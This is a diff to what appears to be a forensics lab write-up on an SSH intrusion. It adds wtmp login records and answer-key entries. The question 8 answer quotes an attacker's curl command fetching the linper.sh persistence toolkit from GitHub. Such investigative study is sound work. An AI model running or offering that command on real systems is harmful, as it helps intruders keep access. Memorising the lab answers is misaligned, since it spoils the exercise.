@@ -56,6 +56,16 @@ Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2
 
 ## qn3
 ```
+
+
+answer:2024-03-06T06:32:45
+
+[7] [01583] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-03-06T06:19:55,151913+00:00]
+[7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]
+[8] [02491] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-03-06T06:37:24,590579+00:00]
+[7] [02667] [ts/1] [cyberjunkie] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:37:35,475575+00:00]
+
+
 HINT:
 In Linux operating systems everything is logged some where. Most of the system logs are logged in to /var/log folder. This folder contains logs related to different services and applications. In this folder we have some files such as utmp, wtmp and btmp. These files contains all the details about login’s and logout’s which are from local as well as from remote systems and system status such as uptime etc.
 
@@ -130,6 +140,9 @@ Understanding the context and the specific details of the attack is crucial for 
 ## qn 8
 ```
 answer: /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+
+
+HINT:
 
 ```
 
